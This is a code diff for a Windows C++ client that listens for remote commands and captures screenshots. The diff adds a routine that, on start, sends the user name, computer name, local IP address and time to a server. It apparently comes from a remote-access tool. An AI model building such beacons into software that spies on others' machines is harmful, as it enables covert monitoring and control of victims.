@@ -4,6 +4,7 @@
 #include <iostream>
 #include <windows.h>
 #include <Lmcons.h>
+#include <sstream>
 #include <thread>
 
 #include "Constants.h"
@@ -45,8 +46,66 @@ Client::~Client() {
 }
 
 void Client::start() {
+    sendClientInfo();
     std::thread commandThread(&Client::listenForCommands, this);
     commandThread.join();
+}
+
+std::string getLocalIPv4() {
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) != 0) {
+        std::cerr << "gethostname failed" << std::endl;
+        return "";
+    }
+
+    hostent* host = gethostbyname(hostname);
+    if (host == nullptr) {
+        std::cerr << "gethostbyname failed" << std::endl;
+        return "";
+    }
+
+    for (char** addr = host->h_addr_list; *addr != nullptr; ++addr) {
+        struct in_addr* ipv4 = reinterpret_cast<struct in_addr*>(*addr);
+        if (ipv4) {
+            return inet_ntoa(*ipv4); // Возвращаем первый найденный IPv4 адрес
+        }
+    }
+
+    return ""; // Если адрес не найден
+}
+
+
+void Client::sendClientInfo() const
+{
+    // Время подключения
+    auto now = std::chrono::system_clock::now();
+    std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
+    std::stringstream timeStream;
+    timeStream << std::put_time(std::localtime(&currentTime), "%d-%m-%Y %H:%M:%S");
+
+    // Имя пользователя
+    char username[UNLEN + 1];
+    DWORD username_len = UNLEN + 1;
+    GetUserNameA(username, &username_len);
+
+    // Имя компьютера
+    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
+    GetComputerNameA(computerName, &computerName_len);
+
+    // IP-адрес
+    std::string ipAddress = getLocalIPv4(); // Используем IP-адрес сервера для упрощения
+
+    // Собираем информацию в строку
+    std::stringstream infoStream;
+    infoStream << timeStream.str() << " | ";
+    infoStream << "User: " << username << " | ";
+    infoStream << "PC Name: " << computerName << " | ";
+    infoStream << "IP Address: " << ipAddress;
+
+    // Отправляем информацию на сервер
+    std::string clientInfo = infoStream.str();
+    send(m_socket, clientInfo.c_str(), clientInfo.size() + 1, 0);
 }
 
 void Client::captureScreenshot(const std::string& wPath) {
